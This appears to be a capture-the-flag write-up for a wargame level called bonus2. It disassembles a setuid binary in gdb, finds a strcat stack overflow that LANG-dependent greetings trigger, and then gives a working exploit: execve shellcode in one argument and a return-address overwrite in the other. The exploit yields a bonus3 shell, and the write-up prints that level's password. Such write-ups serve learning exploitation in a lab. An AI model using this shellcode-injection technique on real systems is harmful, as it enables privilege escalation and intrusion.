```shell
$> ls -la
[...]
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
[...]

$> ./bonus2

$> ./bonus2 test

$> ./bonus2 test blabla
Hello test

# program asks for two arguments and prints 'Hello test'
```

```shell
$> gdb -q bonus2
(gdb) i func
[...]
0x08048484  greetuser
0x08048529  main
[...]

# program calls greetuser() function and main()

(gdb) i var
[...]
0x08049988  language

# program uses global variable 'language'

(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x0804855c <+51>:    mov    eax,DWORD PTR [ebp+0xc]
    0x0804855f <+54>:    add    eax,0x4
    0x08048562 <+57>:    mov    eax,DWORD PTR [eax]
    0x08048564 <+59>:    mov    DWORD PTR [esp+0x8],0x28
    0x0804856c <+67>:    mov    DWORD PTR [esp+0x4],eax
    0x08048570 <+71>:    lea    eax,[esp+0x50]
    0x08048574 <+75>:    mov    DWORD PTR [esp],eax
    0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>         #1
    0x0804857c <+83>:    mov    eax,DWORD PTR [ebp+0xc]
    0x0804857f <+86>:    add    eax,0x8
    0x08048582 <+89>:    mov    eax,DWORD PTR [eax]
    0x08048584 <+91>:    mov    DWORD PTR [esp+0x8],0x20
    0x0804858c <+99>:    mov    DWORD PTR [esp+0x4],eax
    0x08048590 <+103>:   lea    eax,[esp+0x50]
    0x08048594 <+107>:   add    eax,0x28
    0x08048597 <+110>:   mov    DWORD PTR [esp],eax
    0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>         #2
    0x0804859f <+118>:   mov    DWORD PTR [esp],0x8048738
    0x080485a6 <+125>:   call   0x8048380 <getenv@plt>          #3
    [...]
    0x080485bc <+147>:   mov    DWORD PTR [esp+0x8],0x2
    0x080485c4 <+155>:   mov    DWORD PTR [esp+0x4],0x804873d
        [...]
    0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
        [...]
    0x080485df <+182>:   mov    DWORD PTR ds:0x8049988,0x1      #4
    [...]
    0x080485eb <+194>:   mov    DWORD PTR [esp+0x8],0x2
    0x080485f3 <+202>:   mov    DWORD PTR [esp+0x4],0x8048740
        [...]
    0x08048605 <+220>:   call   0x8048360 <memcmp@plt>          
        [...]
    0x0804860e <+229>:   mov    DWORD PTR ds:0x8049988,0x2      #5
    [...]
    0x0804862b <+258>:   call   0x8048484 <greetuser>           #6
    [...]

#1: 1st time strncpy called to copy 40 bytes (0x28) from argv[1] (ebp+0xc+0x4) to buffer (esp+0x50)
#2: 2nd time strncpy called to copy 32 bytes (0x20) from argv[2] (ebp+0xc+0x8) to buffer (esp+0x50+0x28)
#3: getenv called to get the value of environment variable 'LANG' (0x8048738)
#4: if 'LANG' is 'fi' (0x804873d), then set global variable 'language' (0x8049988) to 1
#5: if 'LANG' is 'nl' (0x8048740), then set global variable 'language' (0x8049988) to 2
#6: greetuser() function called

(gdb) disas greetuser
    [...]
    0x0804848a <+6>:     mov    eax,ds:0x8049988
    0x0804848f <+11>:    cmp    eax,0x1
    0x08048492 <+14>:    je     0x80484ba <greetuser+54>        #2
    0x08048494 <+16>:    cmp    eax,0x2
    0x08048497 <+19>:    je     0x80484e9 <greetuser+101>       #3
    [...]
    0x0804849d <+25>:    mov    edx,0x8048710
    0x080484a2 <+30>:    lea    eax,[ebp-0x48]
    0x080484a5 <+33>:    mov    ecx,DWORD PTR [edx]
    0x080484a7 <+35>:    mov    DWORD PTR [eax],ecx
    0x080484a9 <+37>:    movzx  ecx,WORD PTR [edx+0x4]
    0x080484ad <+41>:    mov    WORD PTR [eax+0x4],cx
    0x080484b1 <+45>:    movzx  edx,BYTE PTR [edx+0x6]
    0x080484b5 <+49>:    mov    BYTE PTR [eax+0x6],dl
    0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>       #1
    0x080484ba <+54>:    mov    edx,0x8048717
    0x080484bf <+59>:    lea    eax,[ebp-0x48]
    0x080484c2 <+62>:    mov    ecx,DWORD PTR [edx]
    0x080484c4 <+64>:    mov    DWORD PTR [eax],ecx
    0x080484c6 <+66>:    mov    ecx,DWORD PTR [edx+0x4]
    0x080484c9 <+69>:    mov    DWORD PTR [eax+0x4],ecx
    0x080484cc <+72>:    mov    ecx,DWORD PTR [edx+0x8]
    0x080484cf <+75>:    mov    DWORD PTR [eax+0x8],ecx
    0x080484d2 <+78>:    mov    ecx,DWORD PTR [edx+0xc]
    0x080484d5 <+81>:    mov    DWORD PTR [eax+0xc],ecx
    0x080484d8 <+84>:    movzx  ecx,WORD PTR [edx+0x10]
    0x080484dc <+88>:    mov    WORD PTR [eax+0x10],cx
    0x080484e0 <+92>:    movzx  edx,BYTE PTR [edx+0x12]
    0x080484e4 <+96>:    mov    BYTE PTR [eax+0x12],dl
    0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>       #2
    0x080484e9 <+101>:   mov    edx,0x804872a
    0x080484ee <+106>:   lea    eax,[ebp-0x48]
    0x080484f1 <+109>:   mov    ecx,DWORD PTR [edx]
    0x080484f3 <+111>:   mov    DWORD PTR [eax],ecx
    0x080484f5 <+113>:   mov    ecx,DWORD PTR [edx+0x4]
    0x080484f8 <+116>:   mov    DWORD PTR [eax+0x4],ecx
    0x080484fb <+119>:   mov    ecx,DWORD PTR [edx+0x8]
    0x080484fe <+122>:   mov    DWORD PTR [eax+0x8],ecx
    0x08048501 <+125>:   movzx  edx,WORD PTR [edx+0xc]
    0x08048505 <+129>:   mov    WORD PTR [eax+0xc],dx           #3
    0x08048509 <+133>:   nop
    0x0804850a <+134>:   lea    eax,[ebp+0x8]
    0x0804850d <+137>:   mov    DWORD PTR [esp+0x4],eax
    0x08048511 <+141>:   lea    eax,[ebp-0x48]
    0x08048514 <+144>:   mov    DWORD PTR [esp],eax
    0x08048517 <+147>:   call   0x8048370 <strcat@plt>          #4
    0x0804851c <+152>:   lea    eax,[ebp-0x48]
    0x0804851f <+155>:   mov    DWORD PTR [esp],eax
    0x08048522 <+158>:   call   0x8048390 <puts@plt>            #5
    [...]

#1: if 'language' is 0, then copy string "Hello " (0x8048710) to buffer (ebp-0x48)
#2: if 'language' is 1, then copy string "Hyvää päivää " (0x8048717) to buffer (ebp-0x48)
#3: if 'language' is 2, then copy string "Goedemiddag! " (0x804872a) to buffer (ebp-0x48)
#4: strcat() called to concatenate buffer (in main) (ebp+0x8) to buffer (int greetuser) (ebp-0x48)
#5: puts() called to print buffer (ebp-0x48)
```

We don't have shell execute here so we need inject a shellcode.
To use overflow of strcat(), we can overwrite the return address (eip).

```shell
$> export LANG="nl"

# here we use language 2 (Goedemiddag! ), we can alse use "fi" 

$> gdb -q bonus2
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[...]
0x38614137 in ?? ()

# the offset is 23

$> ltrace ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
[...]
strncpy(0xbffff620, [...]
[...]

# We will inject the shellcode at the first 40 bytes of the buffer

$> ./bonus2 $(python -c "print '\x90' * 19 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'") $(python -c "print '\x90' * 23 + '\x6a\xf6\xff\xbf'")

# first args:
# '\x90' * 19: padding of 19 bytes because the shellcode is 21 bytes long
# second args:
# '\x90' * 23: padding of 23 bytes because the offset is 23
# '\x6a\xf6\xff\xbf': 0xbffff620 + 10 = 0xbffff62a, I add 10 to be sure execute the shellcode

[...]
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```